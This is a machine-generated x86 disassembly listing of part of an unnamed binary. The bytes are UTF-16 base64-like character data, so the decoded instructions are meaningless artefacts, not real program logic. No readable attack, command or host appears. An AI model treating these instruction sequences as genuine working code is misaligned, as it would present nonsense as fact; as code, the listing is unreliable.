  40ac4e:	74 00                	je     0x40ac50
  40ac50:	45                   	inc    %ebp
  40ac51:	00 32                	add    %dh,(%edx)
  40ac53:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40ac57:	00 6a 00             	add    %ch,0x0(%edx)
  40ac5a:	7a 00                	jp     0x40ac5c
  40ac5c:	4f                   	dec    %edi
  40ac5d:	00 78 00             	add    %bh,0x0(%eax)
  40ac60:	63 00                	arpl   %eax,(%eax)
  40ac62:	50                   	push   %eax
  40ac63:	00 35 00 41 00 48    	add    %dh,0x48004100
  40ac69:	00 4c 00 42          	add    %cl,0x42(%eax,%eax,1)
  40ac6d:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40ac71:	00 48 00             	add    %cl,0x0(%eax)
  40ac74:	34 00                	xor    $0x0,%al
  40ac76:	70 00                	jo     0x40ac78
  40ac78:	5a                   	pop    %edx
  40ac79:	00 30                	add    %dh,(%eax)
  40ac7b:	00 6d 00             	add    %ch,0x0(%ebp)
  40ac7e:	54                   	push   %esp
  40ac7f:	00 36                	add    %dh,(%esi)
  40ac81:	00 42 00             	add    %al,0x0(%edx)
  40ac84:	4b                   	dec    %ebx
  40ac85:	00 4f 00             	add    %cl,0x0(%edi)
  40ac88:	4c                   	dec    %esp
  40ac89:	00 4c 00 73          	add    %cl,0x73(%eax,%eax,1)
  40ac8d:	00 31                	add    %dh,(%ecx)
  40ac8f:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac92:	61                   	popa
  40ac93:	00 6a 00             	add    %ch,0x0(%edx)
  40ac96:	37                   	aaa
  40ac97:	00 35 00 7a 00 72    	add    %dh,0x72007a00
  40ac9d:	00 58 00             	add    %bl,0x0(%eax)
  40aca0:	46                   	inc    %esi
  40aca1:	00 55 00             	add    %dl,0x0(%ebp)
  40aca4:	34 00                	xor    $0x0,%al
  40aca6:	4b                   	dec    %ebx
  40aca7:	00 4b 00             	add    %cl,0x0(%ebx)
  40acaa:	35 00 78 00 71       	xor    $0x71007800,%eax
  40acaf:	00 71 00             	add    %dh,0x0(%ecx)
  40acb2:	58                   	pop    %eax
  40acb3:	00 50 00             	add    %dl,0x0(%eax)
  40acb6:	2b 00                	sub    (%eax),%eax
  40acb8:	4d                   	dec    %ebp
  40acb9:	00 3d 00 00 87 b1    	add    %bh,0xb1870000
  40acbf:	59                   	pop    %ecx
  40acc0:	00 56 00             	add    %dl,0x0(%esi)
  40acc3:	57                   	push   %edi
  40acc4:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  40acc8:	00 43 00             	add    %al,0x0(%ebx)
  40accb:	4a                   	dec    %edx
  40accc:	00 69 00             	add    %ch,0x0(%ecx)
  40accf:	76 00                	jbe    0x40acd1
  40acd1:	51                   	push   %ecx
  40acd2:	00 39                	add    %bh,(%ecx)
  40acd4:	00 70 00             	add    %dh,0x0(%eax)
  40acd7:	34 00                	xor    $0x0,%al
  40acd9:	43                   	inc    %ebx
  40acda:	00 51 00             	add    %dl,0x0(%ecx)
  40acdd:	72 00                	jb     0x40acdf
  40acdf:	32 00                	xor    (%eax),%al
  40ace1:	33 00                	xor    (%eax),%eax
  40ace3:	6f                   	outsl  %ds:(%esi),(%dx)
  40ace4:	00 79 00             	add    %bh,0x0(%ecx)
  40ace7:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40acea:	00 63 00             	add    %ah,0x0(%ebx)
  40aced:	4f                   	dec    %edi
  40acee:	00 36                	add    %dh,(%esi)
  40acf0:	00 43 00             	add    %al,0x0(%ebx)
  40acf3:	57                   	push   %edi
  40acf4:	00 48 00             	add    %cl,0x0(%eax)
  40acf7:	5a                   	pop    %edx
  40acf8:	00 79 00             	add    %bh,0x0(%ecx)
  40acfb:	6c                   	insb   (%dx),%es:(%edi)
  40acfc:	00 51 00             	add    %dl,0x0(%ecx)
  40acff:	38 00                	cmp    %al,(%eax)
  40ad01:	35 00 35 00 52       	xor    $0x52003500,%eax
  40ad06:	00 35 00 6e 00 52    	add    %dh,0x52006e00
  40ad0c:	00 4f 00             	add    %cl,0x0(%edi)
  40ad0f:	4f                   	dec    %edi
  40ad10:	00 7a 00             	add    %bh,0x0(%edx)
  40ad13:	68 00 37 00 2b       	push   $0x2b003700
  40ad18:	00 44 00 75          	add    %al,0x75(%eax,%eax,1)
  40ad1c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad1f:	5a                   	pop    %edx
  40ad20:	00 68 00             	add    %ch,0x0(%eax)
  40ad23:	39 00                	cmp    %eax,(%eax)
  40ad25:	54                   	push   %esp
  40ad26:	00 38                	add    %bh,(%eax)
  40ad28:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad2b:	47                   	inc    %edi
  40ad2c:	00 31                	add    %dh,(%ecx)
  40ad2e:	00 42 00             	add    %al,0x0(%edx)
  40ad31:	63 00                	arpl   %eax,(%eax)
  40ad33:	4a                   	dec    %edx
  40ad34:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40ad38:	00 55 00             	add    %dl,0x0(%ebp)
  40ad3b:	32 00                	xor    (%eax),%al
  40ad3d:	34 00                	xor    $0x0,%al
  40ad3f:	51                   	push   %ecx
  40ad40:	00 36                	add    %dh,(%esi)
  40ad42:	00 41 00             	add    %al,0x0(%ecx)
  40ad45:	78 00                	js     0x40ad47
  40ad47:	56                   	push   %esi
  40ad48:	00 45 00             	add    %al,0x0(%ebp)
  40ad4b:	72 00                	jb     0x40ad4d
  40ad4d:	53                   	push   %ebx
  40ad4e:	00 37                	add    %dh,(%edi)
  40ad50:	00 31                	add    %dh,(%ecx)
  40ad52:	00 62 00             	add    %ah,0x0(%edx)
  40ad55:	71 00                	jno    0x40ad57
  40ad57:	34 00                	xor    $0x0,%al
  40ad59:	44                   	inc    %esp
  40ad5a:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40ad5e:	00 4a 00             	add    %cl,0x0(%edx)
  40ad61:	48                   	dec    %eax
  40ad62:	00 59 00             	add    %bl,0x0(%ecx)
  40ad65:	38 00                	cmp    %al,(%eax)
  40ad67:	4d                   	dec    %ebp
  40ad68:	00 74 00 4f          	add    %dh,0x4f(%eax,%eax,1)
  40ad6c:	00 75 00             	add    %dh,0x0(%ebp)
  40ad6f:	49                   	dec    %ecx
  40ad70:	00 72 00             	add    %dh,0x0(%edx)
  40ad73:	37                   	aaa
  40ad74:	00 63 00             	add    %ah,0x0(%ebx)
  40ad77:	78 00                	js     0x40ad79
  40ad79:	66 00 41 00          	data16 add %al,0x0(%ecx)
  40ad7d:	68 00 62 00 45       	push   $0x45006200
  40ad82:	00 6f 00             	add    %ch,0x0(%edi)
  40ad85:	2f                   	das
  40ad86:	00 31                	add    %dh,(%ecx)
  40ad88:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad8b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40ad8f:	70 00                	jo     0x40ad91
  40ad91:	6b 00 58             	imul   $0x58,(%eax),%eax
  40ad94:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad97:	54                   	push   %esp
  40ad98:	00 46 00             	add    %al,0x0(%esi)
  40ad9b:	64 00 63 00          	add    %ah,%fs:0x0(%ebx)
  40ad9f:	69 00 5a 00 73 00    	imul   $0x73005a,(%eax),%eax
  40ada5:	43                   	inc    %ebx
  40ada6:	00 4f 00             	add    %cl,0x0(%edi)
  40ada9:	47                   	inc    %edi
  40adaa:	00 47 00             	add    %al,0x0(%edi)
  40adad:	4a                   	dec    %edx
  40adae:	00 77 00             	add    %dh,0x0(%edi)
  40adb1:	56                   	push   %esi
  40adb2:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  40adb6:	00 54 00 4f          	add    %dl,0x4f(%eax,%eax,1)
  40adba:	00 69 00             	add    %ch,0x0(%ecx)
  40adbd:	30 00                	xor    %al,(%eax)
  40adbf:	35 00 46 00 67       	xor    $0x67004600,%eax
  40adc4:	00 4b 00             	add    %cl,0x0(%ebx)
  40adc7:	48                   	dec    %eax
  40adc8:	00 50 00             	add    %dl,0x0(%eax)
  40adcb:	32 00                	xor    (%eax),%al
  40adcd:	56                   	push   %esi
  40adce:	00 6a 00             	add    %ch,0x0(%edx)
  40add1:	6b 00 52             	imul   $0x52,(%eax),%eax
  40add4:	00 57 00             	add    %dl,0x0(%edi)
  40add7:	6e                   	outsb  %ds:(%esi),(%dx)
  40add8:	00 6a 00             	add    %ch,0x0(%edx)
  40addb:	6e                   	outsb  %ds:(%esi),(%dx)
  40addc:	00 79 00             	add    %bh,0x0(%ecx)
  40addf:	49                   	dec    %ecx
  40ade0:	00 48 00             	add    %cl,0x0(%eax)
  40ade3:	36 00 6e 00          	add    %ch,%ss:0x0(%esi)
  40ade7:	50                   	push   %eax
  40ade8:	00 51 00             	add    %dl,0x0(%ecx)
  40adeb:	69 00 43 00 58 00    	imul   $0x580043,(%eax),%eax
  40adf1:	67 00 6f 00          	add    %ch,0x0(%bx)
  40adf5:	77 00                	ja     0x40adf7
  40adf7:	37                   	aaa
  40adf8:	00 67 00             	add    %ah,0x0(%edi)
  40adfb:	56                   	push   %esi
  40adfc:	00 4f 00             	add    %cl,0x0(%edi)
  40adff:	35 00 79 00 59       	xor    $0x59007900,%eax
  40ae04:	00 37                	add    %dh,(%edi)
  40ae06:	00 4f 00             	add    %cl,0x0(%edi)
  40ae09:	30 00                	xor    %al,(%eax)
  40ae0b:	41                   	inc    %ecx
  40ae0c:	00 33                	add    %dh,(%ebx)
  40ae0e:	00 2f                	add    %ch,(%edi)
  40ae10:	00 33                	add    %dh,(%ebx)
  40ae12:	00 42 00             	add    %al,0x0(%edx)
  40ae15:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae16:	00 32                	add    %dh,(%edx)
  40ae18:	00 6b 00             	add    %ch,0x0(%ebx)
  40ae1b:	51                   	push   %ecx
  40ae1c:	00 37                	add    %dh,(%edi)
  40ae1e:	00 78 00             	add    %bh,0x0(%eax)
  40ae21:	4e                   	dec    %esi
  40ae22:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae25:	30 00                	xor    %al,(%eax)
  40ae27:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae28:	00 68 00             	add    %ch,0x0(%eax)
  40ae2b:	77 00                	ja     0x40ae2d
  40ae2d:	69 00 71 00 7a 00    	imul   $0x7a0071,(%eax),%eax
  40ae33:	53                   	push   %ebx
  40ae34:	00 48 00             	add    %cl,0x0(%eax)
  40ae37:	4a                   	dec    %edx
  40ae38:	00 58 00             	add    %bl,0x0(%eax)
  40ae3b:	33 00                	xor    (%eax),%eax
  40ae3d:	39 00                	cmp    %eax,(%eax)
  40ae3f:	7a 00                	jp     0x40ae41
  40ae41:	4b                   	dec    %ebx
  40ae42:	00 70 00             	add    %dh,0x0(%eax)
  40ae45:	44                   	inc    %esp
  40ae46:	00 31                	add    %dh,(%ecx)
  40ae48:	00 63 00             	add    %ah,0x0(%ebx)
  40ae4b:	6d                   	insl   (%dx),%es:(%edi)
  40ae4c:	00 57 00             	add    %dl,0x0(%edi)
  40ae4f:	2b 00                	sub    (%eax),%eax
  40ae51:	46                   	inc    %esi
  40ae52:	00 4f 00             	add    %cl,0x0(%edi)
  40ae55:	71 00                	jno    0x40ae57
  40ae57:	61                   	popa
  40ae58:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae5b:	79 00                	jns    0x40ae5d
  40ae5d:	2b 00                	sub    (%eax),%eax
  40ae5f:	73 00                	jae    0x40ae61
  40ae61:	6b 00 36             	imul   $0x36,(%eax),%eax
  40ae64:	00 39                	add    %bh,(%ecx)
  40ae66:	00 49 00             	add    %cl,0x0(%ecx)
  40ae69:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae6a:	00 42 00             	add    %al,0x0(%edx)
  40ae6d:	69 00 72 00 52 00    	imul   $0x520072,(%eax),%eax
  40ae73:	76 00                	jbe    0x40ae75
  40ae75:	46                   	inc    %esi
  40ae76:	00 31                	add    %dh,(%ecx)
  40ae78:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae7b:	34 00                	xor    $0x0,%al
  40ae7d:	58                   	pop    %eax
  40ae7e:	00 6e 00             	add    %ch,0x0(%esi)
  40ae81:	31 00                	xor    %eax,(%eax)
  40ae83:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae84:	00 52 00             	add    %dl,0x0(%edx)
  40ae87:	49                   	dec    %ecx
  40ae88:	00 65 00             	add    %ah,0x0(%ebp)
  40ae8b:	56                   	push   %esi
  40ae8c:	00 77 00             	add    %dh,0x0(%edi)
  40ae8f:	75 00                	jne    0x40ae91
  40ae91:	72 00                	jb     0x40ae93
  40ae93:	47                   	inc    %edi
  40ae94:	00 35 00 30 00 77    	add    %dh,0x77003000
  40ae9a:	00 59 00             	add    %bl,0x0(%ecx)
  40ae9d:	6c                   	insb   (%dx),%es:(%edi)
  40ae9e:	00 36                	add    %dh,(%esi)
  40aea0:	00 6a 00             	add    %ch,0x0(%edx)
  40aea3:	47                   	inc    %edi
  40aea4:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40aea8:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40aeac:	00 37                	add    %dh,(%edi)
  40aeae:	00 68 00             	add    %ch,0x0(%eax)
  40aeb1:	61                   	popa
  40aeb2:	00 52 00             	add    %dl,0x0(%edx)
  40aeb5:	63 00                	arpl   %eax,(%eax)
  40aeb7:	57                   	push   %edi
  40aeb8:	00 77 00             	add    %dh,0x0(%edi)
  40aebb:	55                   	push   %ebp
  40aebc:	00 35 00 77 00 79    	add    %dh,0x79007700
  40aec2:	00 56 00             	add    %dl,0x0(%esi)
  40aec5:	67 00 41 00          	add    %al,0x0(%bx,%di)
  40aec9:	50                   	push   %eax
  40aeca:	00 43 00             	add    %al,0x0(%ebx)
  40aecd:	46                   	inc    %esi
  40aece:	00 4b 00             	add    %cl,0x0(%ebx)
  40aed1:	6b 00 57             	imul   $0x57,(%eax),%eax
  40aed4:	00 76 00             	add    %dh,0x0(%esi)
  40aed7:	56                   	push   %esi
  40aed8:	00 64 00 41          	add    %ah,0x41(%eax,%eax,1)
  40aedc:	00 66 00             	add    %ah,0x0(%esi)
  40aedf:	44                   	inc    %esp
  40aee0:	00 72 00             	add    %dh,0x0(%edx)
  40aee3:	6b 00 71             	imul   $0x71,(%eax),%eax
  40aee6:	00 55 00             	add    %dl,0x0(%ebp)
  40aee9:	70 00                	jo     0x40aeeb
  40aeeb:	66 00 37             	data16 add %dh,(%edi)
  40aeee:	00 77 00             	add    %dh,0x0(%edi)
  40aef1:	49                   	dec    %ecx
  40aef2:	00 42 00             	add    %al,0x0(%edx)
  40aef5:	38 00                	cmp    %al,(%eax)
  40aef7:	47                   	inc    %edi
  40aef8:	00 66 00             	add    %ah,0x0(%esi)
  40aefb:	39 00                	cmp    %eax,(%eax)
  40aefd:	6f                   	outsl  %ds:(%esi),(%dx)
  40aefe:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40af02:	00 4f 00             	add    %cl,0x0(%edi)
  40af05:	41                   	inc    %ecx
  40af06:	00 53 00             	add    %dl,0x0(%ebx)
  40af09:	78 00                	js     0x40af0b
  40af0b:	46                   	inc    %esi
  40af0c:	00 38                	add    %bh,(%eax)
  40af0e:	00 43 00             	add    %al,0x0(%ebx)
  40af11:	62 00                	bound  %eax,(%eax)
  40af13:	70 00                	jo     0x40af15
  40af15:	76 00                	jbe    0x40af17
  40af17:	44                   	inc    %esp
  40af18:	00 61 00             	add    %ah,0x0(%ecx)
  40af1b:	59                   	pop    %ecx
  40af1c:	00 33                	add    %dh,(%ebx)
  40af1e:	00 6d 00             	add    %ch,0x0(%ebp)
  40af21:	77 00                	ja     0x40af23
  40af23:	51                   	push   %ecx
  40af24:	00 74 00 43          	add    %dh,0x43(%eax,%eax,1)
  40af28:	00 62 00             	add    %ah,0x0(%edx)
  40af2b:	6a 00                	push   $0x0
  40af2d:	34 00                	xor    $0x0,%al
  40af2f:	41                   	inc    %ecx
  40af30:	00 41 00             	add    %al,0x0(%ecx)
  40af33:	6b 00 4d             	imul   $0x4d,(%eax),%eax
  40af36:	00 42 00             	add    %al,0x0(%edx)
  40af39:	38 00                	cmp    %al,(%eax)
  40af3b:	2b 00                	sub    (%eax),%eax
  40af3d:	2b 00                	sub    (%eax),%eax
  40af3f:	31 00                	xor    %eax,(%eax)
  40af41:	32 00                	xor    (%eax),%al
  40af43:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40af47:	42                   	inc    %edx
  40af48:	00 73 00             	add    %dh,0x0(%ebx)
  40af4b:	53                   	push   %ebx
  40af4c:	00 74 00 34          	add    %dh,0x34(%eax,%eax,1)
  40af50:	00 56 00             	add    %dl,0x0(%esi)
  40af53:	63 00                	arpl   %eax,(%eax)
  40af55:	72 00                	jb     0x40af57
  40af57:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40af5b:	77 00                	ja     0x40af5d
  40af5d:	4f                   	dec    %edi
  40af5e:	00 68 00             	add    %ch,0x0(%eax)
  40af61:	36 00 44 00 74       	add    %al,%ss:0x74(%eax,%eax,1)
  40af66:	00 68 00             	add    %ch,0x0(%eax)
  40af69:	4e                   	dec    %esi
  40af6a:	00 33                	add    %dh,(%ebx)
  40af6c:	00 73 00             	add    %dh,0x0(%ebx)
  40af6f:	39 00                	cmp    %eax,(%eax)
  40af71:	59                   	pop    %ecx
  40af72:	00 6d 00             	add    %ch,0x0(%ebp)
  40af75:	42                   	inc    %edx
  40af76:	00 66 00             	add    %ah,0x0(%esi)
  40af79:	59                   	pop    %ecx
  40af7a:	00 71 00             	add    %dh,0x0(%ecx)
  40af7d:	58                   	pop    %eax
  40af7e:	00 4e 00             	add    %cl,0x0(%esi)
  40af81:	61                   	popa
  40af82:	00 36                	add    %dh,(%esi)
  40af84:	00 65 00             	add    %ah,0x0(%ebp)
  40af87:	77 00                	ja     0x40af89
  40af89:	4f                   	dec    %edi
  40af8a:	00 6e 00             	add    %ch,0x0(%esi)
  40af8d:	4e                   	dec    %esi
  40af8e:	00 5a 00             	add    %bl,0x0(%edx)
  40af91:	6e                   	outsb  %ds:(%esi),(%dx)
  40af92:	00 67 00             	add    %ah,0x0(%edi)
  40af95:	4b                   	dec    %ebx
  40af96:	00 66 00             	add    %ah,0x0(%esi)
  40af99:	57                   	push   %edi
  40af9a:	00 74 00 49          	add    %dh,0x49(%eax,%eax,1)
  40af9e:	00 79 00             	add    %bh,0x0(%ecx)
  40afa1:	59                   	pop    %ecx
  40afa2:	00 4d 00             	add    %cl,0x0(%ebp)
  40afa5:	6f                   	outsl  %ds:(%esi),(%dx)
  40afa6:	00 35 00 4a 00 2f    	add    %dh,0x2f004a00
  40afac:	00 73 00             	add    %dh,0x0(%ebx)
  40afaf:	37                   	aaa
  40afb0:	00 6b 00             	add    %ch,0x0(%ebx)
  40afb3:	76 00                	jbe    0x40afb5
  40afb5:	63 00                	arpl   %eax,(%eax)
  40afb7:	5a                   	pop    %edx
  40afb8:	00 6e 00             	add    %ch,0x0(%esi)
  40afbb:	46                   	inc    %esi
  40afbc:	00 64 00 52          	add    %ah,0x52(%eax,%eax,1)
  40afc0:	00 76 00             	add    %dh,0x0(%esi)
  40afc3:	4e                   	dec    %esi
  40afc4:	00 74 00 33          	add    %dh,0x33(%eax,%eax,1)
  40afc8:	00 2b                	add    %ch,(%ebx)
  40afca:	00 4d 00             	add    %cl,0x0(%ebp)
  40afcd:	72 00                	jb     0x40afcf
  40afcf:	75 00                	jne    0x40afd1
  40afd1:	35 00 6d 00 76       	xor    $0x76006d00,%eax
  40afd6:	00 6d 00             	add    %ch,0x0(%ebp)
  40afd9:	69 00 32 00 75 00    	imul   $0x750032,(%eax),%eax
  40afdf:	2b 00                	sub    (%eax),%eax
  40afe1:	74 00                	je     0x40afe3
  40afe3:	66 00 46 00          	data16 add %al,0x0(%esi)
  40afe7:	56                   	push   %esi
  40afe8:	00 2b                	add    %ch,(%ebx)
  40afea:	00 47 00             	add    %al,0x0(%edi)
  40afed:	6d                   	insl   (%dx),%es:(%edi)
  40afee:	00 2f                	add    %ch,(%edi)
  40aff0:	00 37                	add    %dh,(%edi)
  40aff2:	00 52 00             	add    %dl,0x0(%edx)
  40aff5:	73 00                	jae    0x40aff7
  40aff7:	77 00                	ja     0x40aff9
  40aff9:	50                   	push   %eax
  40affa:	00 42 00             	add    %al,0x0(%edx)
  40affd:	35 00 6a 00 4c       	xor    $0x4c006a00,%eax
  40b002:	00 52 00             	add    %dl,0x0(%edx)
  40b005:	43                   	inc    %ebx
  40b006:	00 56 00             	add    %dl,0x0(%esi)
  40b009:	47                   	inc    %edi
  40b00a:	00 43 00             	add    %al,0x0(%ebx)
  40b00d:	62 00                	bound  %eax,(%eax)
  40b00f:	58                   	pop    %eax
  40b010:	00 33                	add    %dh,(%ebx)
  40b012:	00 6a 00             	add    %ch,0x0(%edx)
  40b015:	5a                   	pop    %edx
  40b016:	00 62 00             	add    %ah,0x0(%edx)
  40b019:	4b                   	dec    %ebx
  40b01a:	00 56 00             	add    %dl,0x0(%esi)
  40b01d:	4d                   	dec    %ebp
  40b01e:	00 47 00             	add    %al,0x0(%edi)
  40b021:	6f                   	outsl  %ds:(%esi),(%dx)
  40b022:	00 35 00 2b 00 39    	add    %dh,0x39002b00
  40b028:	00 56 00             	add    %dl,0x0(%esi)
  40b02b:	38 00                	cmp    %al,(%eax)
  40b02d:	37                   	aaa
  40b02e:	00 78 00             	add    %bh,0x0(%eax)
  40b031:	6e                   	outsb  %ds:(%esi),(%dx)
  40b032:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b035:	54                   	push   %esp
  40b036:	00 76 00             	add    %dh,0x0(%esi)
  40b039:	35 00 78 00 73       	xor    $0x73007800,%eax
  40b03e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b041:	42                   	inc    %edx
  40b042:	00 4f 00             	add    %cl,0x0(%edi)
  40b045:	4b                   	dec    %ebx
  40b046:	00 4e 00             	add    %cl,0x0(%esi)
  40b049:	56                   	push   %esi
  40b04a:	00 35 00 6f 00 32    	add    %dh,0x32006f00
  40b050:	00 71 00             	add    %dh,0x0(%ecx)
  40b053:	45                   	inc    %ebp
  40b054:	00 77 00             	add    %dh,0x0(%edi)
  40b057:	59                   	pop    %ecx
  40b058:	00 69 00             	add    %ch,0x0(%ecx)
  40b05b:	43                   	inc    %ebx
  40b05c:	00 79 00             	add    %bh,0x0(%ecx)
  40b05f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b060:	00 68 00             	add    %ch,0x0(%eax)
  40b063:	52                   	push   %edx
  40b064:	00 6d 00             	add    %ch,0x0(%ebp)
  40b067:	43                   	inc    %ebx
  40b068:	00 42 00             	add    %al,0x0(%edx)
  40b06b:	62 00                	bound  %eax,(%eax)
  40b06d:	37                   	aaa
  40b06e:	00 58 00             	add    %bl,0x0(%eax)
  40b071:	6b 00 37             	imul   $0x37,(%eax),%eax
  40b074:	00 6e 00             	add    %ch,0x0(%esi)
  40b077:	48                   	dec    %eax
  40b078:	00 4d 00             	add    %cl,0x0(%ebp)
  40b07b:	37                   	aaa
  40b07c:	00 2f                	add    %ch,(%edi)
  40b07e:	00 32                	add    %dh,(%edx)
  40b080:	00 41 00             	add    %al,0x0(%ecx)
  40b083:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b087:	78 00                	js     0x40b089
  40b089:	2b 00                	sub    (%eax),%eax
  40b08b:	6b 00 46             	imul   $0x46,(%eax),%eax
  40b08e:	00 68 00             	add    %ch,0x0(%eax)
  40b091:	4a                   	dec    %edx
  40b092:	00 5a 00             	add    %bl,0x0(%edx)
  40b095:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b099:	30 00                	xor    %al,(%eax)
  40b09b:	70 00                	jo     0x40b09d
  40b09d:	39 00                	cmp    %eax,(%eax)
  40b09f:	72 00                	jb     0x40b0a1
  40b0a1:	32 00                	xor    (%eax),%al
  40b0a3:	66 00 7a 00          	data16 add %bh,0x0(%edx)
  40b0a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0a8:	00 73 00             	add    %dh,0x0(%ebx)
  40b0ab:	73 00                	jae    0x40b0ad
  40b0ad:	52                   	push   %edx
  40b0ae:	00 79 00             	add    %bh,0x0(%ecx)
  40b0b1:	53                   	push   %ebx
  40b0b2:	00 31                	add    %dh,(%ecx)
  40b0b4:	00 64 00 6a          	add    %ah,0x6a(%eax,%eax,1)
  40b0b8:	00 6f 00             	add    %ch,0x0(%edi)
  40b0bb:	7a 00                	jp     0x40b0bd
  40b0bd:	4b                   	dec    %ebx
  40b0be:	00 4e 00             	add    %cl,0x0(%esi)
  40b0c1:	39 00                	cmp    %eax,(%eax)
  40b0c3:	76 00                	jbe    0x40b0c5
  40b0c5:	34 00                	xor    $0x0,%al
  40b0c7:	62 00                	bound  %eax,(%eax)
  40b0c9:	4d                   	dec    %ebp
  40b0ca:	00 5a 00             	add    %bl,0x0(%edx)
  40b0cd:	48                   	dec    %eax
  40b0ce:	00 64 00 50          	add    %ah,0x50(%eax,%eax,1)
  40b0d2:	00 56 00             	add    %dl,0x0(%esi)
  40b0d5:	66 00 68 00          	data16 add %ch,0x0(%eax)
  40b0d9:	42                   	inc    %edx
  40b0da:	00 37                	add    %dh,(%edi)
  40b0dc:	00 47 00             	add    %al,0x0(%edi)
  40b0df:	78 00                	js     0x40b0e1
  40b0e1:	62 00                	bound  %eax,(%eax)
  40b0e3:	4a                   	dec    %edx
  40b0e4:	00 4a 00             	add    %cl,0x0(%edx)
  40b0e7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0e8:	00 58 00             	add    %bl,0x0(%eax)
  40b0eb:	56                   	push   %esi
  40b0ec:	00 36                	add    %dh,(%esi)
  40b0ee:	00 57 00             	add    %dl,0x0(%edi)
  40b0f1:	36 00 5a 00          	add    %bl,%ss:0x0(%edx)
  40b0f5:	35 00 4e 00 34       	xor    $0x34004e00,%eax
  40b0fa:	00 4e 00             	add    %cl,0x0(%esi)
  40b0fd:	76 00                	jbe    0x40b0ff
  40b0ff:	56                   	push   %esi
  40b100:	00 55 00             	add    %dl,0x0(%ebp)
  40b103:	31 00                	xor    %eax,(%eax)
  40b105:	56                   	push   %esi
  40b106:	00 7a 00             	add    %bh,0x0(%edx)
  40b109:	36 00 44 00 4f       	add    %al,%ss:0x4f(%eax,%eax,1)
  40b10e:	00 53 00             	add    %dl,0x0(%ebx)
  40b111:	6a 00                	push   $0x0
  40b113:	31 00                	xor    %eax,(%eax)
  40b115:	4d                   	dec    %ebp
  40b116:	00 56 00             	add    %dl,0x0(%esi)
  40b119:	74 00                	je     0x40b11b
  40b11b:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40b11e:	00 52 00             	add    %dl,0x0(%edx)
  40b121:	5a                   	pop    %edx
  40b122:	00 31                	add    %dh,(%ecx)
  40b124:	00 55 00             	add    %dl,0x0(%ebp)
  40b127:	56                   	push   %esi
  40b128:	00 63 00             	add    %ah,0x0(%ebx)
  40b12b:	31 00                	xor    %eax,(%eax)
  40b12d:	35 00 32 00 42       	xor    $0x42003200,%eax
  40b132:	00 6d 00             	add    %ch,0x0(%ebp)
  40b135:	47                   	inc    %edi
  40b136:	00 6d 00             	add    %ch,0x0(%ebp)
  40b139:	70 00                	jo     0x40b13b
  40b13b:	63 00                	arpl   %eax,(%eax)
  40b13d:	37                   	aaa
  40b13e:	00 4a 00             	add    %cl,0x0(%edx)
  40b141:	50                   	push   %eax
  40b142:	00 4e 00             	add    %cl,0x0(%esi)
  40b145:	43                   	inc    %ebx
  40b146:	00 39                	add    %bh,(%ecx)
  40b148:	00 79 00             	add    %bh,0x0(%ecx)
  40b14b:	58                   	pop    %eax
  40b14c:	00 6b 00             	add    %ch,0x0(%ebx)
  40b14f:	7a 00                	jp     0x40b151
  40b151:	46                   	inc    %esi
  40b152:	00 61 00             	add    %ah,0x0(%ecx)
  40b155:	57                   	push   %edi
  40b156:	00 51 00             	add    %dl,0x0(%ecx)
  40b159:	78 00                	js     0x40b15b
  40b15b:	67 00 70 00          	add    %dh,0x0(%bx,%si)
  40b15f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b160:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
  40b164:	00 70 00             	add    %dh,0x0(%eax)
  40b167:	51                   	push   %ecx
  40b168:	00 6d 00             	add    %ch,0x0(%ebp)
  40b16b:	57                   	push   %edi
  40b16c:	00 68 00             	add    %ch,0x0(%eax)
  40b16f:	46                   	inc    %esi
  40b170:	00 6e 00             	add    %ch,0x0(%esi)
  40b173:	52                   	push   %edx
  40b174:	00 77 00             	add    %dh,0x0(%edi)
  40b177:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b17b:	55                   	push   %ebp
  40b17c:	00 57 00             	add    %dl,0x0(%edi)
  40b17f:	75 00                	jne    0x40b181
  40b181:	2f                   	das
  40b182:	00 52 00             	add    %dl,0x0(%edx)
  40b185:	73 00                	jae    0x40b187
  40b187:	38 00                	cmp    %al,(%eax)
  40b189:	79 00                	jns    0x40b18b
  40b18b:	4e                   	dec    %esi
  40b18c:	00 45 00             	add    %al,0x0(%ebp)
  40b18f:	78 00                	js     0x40b191
  40b191:	6c                   	insb   (%dx),%es:(%edi)
  40b192:	00 71 00             	add    %dh,0x0(%ecx)
  40b195:	41                   	inc    %ecx
  40b196:	00 46 00             	add    %al,0x0(%esi)
  40b199:	59                   	pop    %ecx
  40b19a:	00 54 00 48          	add    %dl,0x48(%eax,%eax,1)
  40b19e:	00 38                	add    %bh,(%eax)
  40b1a0:	00 62 00             	add    %ah,0x0(%edx)
  40b1a3:	48                   	dec    %eax
